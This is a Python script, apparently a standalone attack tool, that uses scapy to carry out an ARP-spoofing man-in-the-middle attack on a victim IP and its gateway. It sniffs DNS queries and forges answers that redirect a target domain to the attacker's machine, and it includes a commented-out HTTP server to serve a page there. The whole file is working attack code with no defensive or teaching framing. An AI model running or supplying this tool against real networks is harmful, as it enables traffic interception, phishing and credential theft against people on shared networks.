#!/usr/bin/env python

from scapy.all import *
import time
import threading
import http.server
import socketserver
import netifaces
import sys
import logging 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

conf.verb = 0

DOMAIN = "example.com"

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = 'index.html'
        return super().do_GET()

def start_http_server():
    PORT = 80
    Handler = CustomHTTPRequestHandler

    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Serving at port {PORT}")
        httpd.serve_forever()

def check_root():
    if os.geteuid() != 0:
        print("Script must run as root")
        sys.exit(1)

def get_gateway_ip():
    try:
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET][0]
        return default_gateway
    except (KeyError, IndexError):
        return None

def get_internal_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    private_ip = s.getsockname()[0]
    s.close()
    return private_ip

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] Could not find MAC address for IP: {ip}")
        sys.exit(1)

def spoof_arp(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  
    send(packet, verbose=False)

def restore_arp(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)  
    send(packet, count=4, verbose=False)

def spoof_dns(pkt, spoofed_ip, target_domain):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode()
        if target_domain in qname:
            print(f"[+] Spoofing DNS request for {qname}")
            dns_response = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                           UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                               an=DNSRR(rrname=qname, rdata=spoofed_ip))
            send(dns_response, verbose=False)

def packet_sniffer(spoofed_ip, target_domain):
    sniff(filter="udp port 53", prn=lambda pkt: spoof_dns(pkt, spoofed_ip, target_domain))

def arp_spoofing_attack(target_ip, gateway_ip):
    print("Sending spoofed ARP packets")
    print("To stop press CTRL+C")
    try:
        while True:
            spoof_arp(target_ip, gateway_ip)  
            spoof_arp(gateway_ip, target_ip)  
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C! Restoring ARP tables...")
        restore_arp(target_ip, gateway_ip)
        print("ARP tables restored.")
        sys.exit(1)

if __name__ == "__main__":
    check_root()
    victim_ip = sys.argv[1]
    router_ip = sys.argv[2] if len(sys.argv) > 2 else get_gateway_ip()
    ip = get_internal_ip()

    #http_thread = threading.Thread(target=start_http_server)
    #http_thread.start()
    print("Router IP:", router_ip)
    print("Target IP:", victim_ip)
    print("Your IP:", ip)
    arp_thread = threading.Thread(target=arp_spoofing_attack, args=(victim_ip, router_ip))  
    arp_thread.start()
    print("Starting DNS spoofing for", DOMAIN)
    packet_sniffer(ip, DOMAIN)  